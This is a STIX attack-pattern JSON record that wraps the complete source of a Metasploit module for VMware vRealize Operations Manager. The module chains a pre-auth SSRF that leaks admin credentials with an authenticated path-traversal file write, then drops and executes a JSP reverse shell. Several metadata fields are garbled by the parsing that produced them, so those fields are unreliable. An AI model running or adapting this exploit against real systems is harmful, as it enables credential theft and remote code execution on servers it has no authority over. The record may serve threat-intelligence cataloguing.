{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc77734a-c594-4876-97fd-112cb9b70975",
    "created": "2024-08-14T17:03:35.864751Z",
    "modified": "2024-08-14T17:03:35.864756Z",
    "name": "VMware vRealize Operations (vROps) Manager SSRF RCE",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_vrops_mgr_ssrf_rce.rb",
            "external_id": "vmware_vrops_mgr_ssrf_rce.rb"
        },
        {
            "source_name": "CVE-2021-21975affectsthe/casa/nodes/thumbprintsendpoint",
            "external_id": "and"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0004.html"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/ptswarm/status/1376961747232382976"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/51Vx3lNI7B/cve-2021-21975#rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vRealize Operations (vROps) Manager SSRF RCE',\n        'Description' => %q{\n          This module exploits a pre-auth SSRF (CVE-2021-21975) and post-auth\n          file write (CVE-2021-21983) in VMware vRealize Operations Manager to\n          leak admin creds and write/execute a JSP payload.\n\n          CVE-2021-21975 affects the /casa/nodes/thumbprints endpoint, and\n          CVE-2021-21983 affects the /casa/private/config/slice/ha/certificate\n          endpoint. Code execution occurs as the \"admin\" Unix user.\n\n          The following vRealize Operations Manager versions are vulnerable:\n\n          * 7.0.0\n          * 7.5.0\n          * 8.0.0, 8.0.1\n          * 8.1.0, 8.1.1\n          * 8.2.0\n          * 8.3.0\n\n          Version 8.3.0 is not exploitable for creds and is therefore not\n          supported by this module. Tested successfully against 8.0.1, 8.1.0,\n          8.1.1, and 8.2.0.\n        },\n        'Author' => [\n          'Egor Dimitrenko', # Discovery\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2021-21975'], # SSRF\n          ['CVE', '2021-21983'], # File write\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0004.html'],\n          ['URL', 'https://twitter.com/ptswarm/status/1376961747232382976'],\n          ['URL', 'https://attackerkb.com/topics/51Vx3lNI7B/cve-2021-21975#rapid7-analysis']\n        ],\n        'DisclosureDate' => '2021-03-30', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Arch' => ARCH_JAVA,\n        'Privileged' => false,\n        'Targets' => [\n          ['vRealize Operations Manager < 8.3.0', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SRVPORT' => 8443,\n          'SSL' => true,\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS, # /usr/lib/vmware-casa/casa-webapp/logs\n            ARTIFACTS_ON_DISK # /usr/lib/vmware-casa/casa-webapp/webapps/casa\n          ]\n        },\n        'Stance' => Stance::Aggressive\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def setup\n    super\n\n    @creds = nil\n\n    print_status('Starting SSRF server...')\n    start_service\n  end\n\n  def check\n    leak_admin_creds ? CheckCode::Vulnerable : CheckCode::Safe\n  end\n\n  def exploit\n    return unless (@creds ||= leak_admin_creds)\n\n    write_jsp_payload\n    execute_jsp_payload\n  end\n\n  def leak_admin_creds\n    # \"Comment out\" trailing path using URI fragment syntax, ostensibly\n    ssrf_uri = \"#{srvhost_addr}:#{srvport}#{get_resource}#\"\n\n    print_status('Leaking admin creds via SSRF...')\n    vprint_status(ssrf_uri)\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/casa/nodes/thumbprints'),\n      'ctype' => 'application/json',\n      'data' => [ssrf_uri].to_json\n    )\n\n    unless res&.code == 200 && res.get_json_document.dig(0, 'address') == ssrf_uri\n      print_error('Failed to send SSRF request')\n      return\n    end\n\n    unless @creds\n      print_error('Failed to leak admin creds')\n      return\n    end\n\n    print_good('Successfully leaked admin creds')\n    vprint_status(\"Authorization: #{@creds}\")\n\n    @creds\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"#{cli.peerhost} connected to SSRF server!\")\n    vprint_line(request.to_s)\n\n    @creds ||= request.headers['Authorization']\n  ensure\n    send_not_found(cli)\n    close_client(cli)\n  end\n\n  def write_jsp_payload\n    jsp_path = \"/usr/lib/vmware-casa/casa-webapp/webapps/casa/#{jsp_filename}\"\n\n    print_status('Writing JSP payload')\n    vprint_status(jsp_path)\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part(\n      \"../../../../..#{jsp_path}\",\n      nil, # Content-Type\n      nil, # Content-Transfer-Encoding\n      'form-data; name=\"name\"'\n    )\n    multipart_form.add_part(\n      payload.encoded,\n      nil, # Content-Type\n      nil, # Content-Transfer-Encoding\n      %(form-data; name=\"file\"; filename=\"#{jsp_filename}\")\n    )\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/casa/private/config/slice/ha/certificate'),\n      'authorization' => @creds,\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    )\n\n    unless res&.code == 200\n      fail_with(Failure::NotVulnerable, 'Failed to write JSP payload')\n    end\n\n    register_file_for_cleanup(jsp_path)\n\n    print_good('Successfully wrote JSP payload')\n  end\n\n  def execute_jsp_payload\n    jsp_uri = normalize_uri(target_uri.path, 'casa', jsp_filename)\n\n    print_status('Executing JSP payload')\n    vprint_status(full_uri(jsp_uri))\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => jsp_uri,\n      'authorization' => @creds\n    )\n\n    unless res&.code == 200\n      fail_with(Failure::PayloadFailed, 'Failed to execute JSP payload')\n    end\n\n    print_good('Successfully executed JSP payload')\n  end\n\n  def jsp_filename\n    @jsp_filename ||= \"#{rand_text_alphanumeric(8..16)}.jsp\"\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-30, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}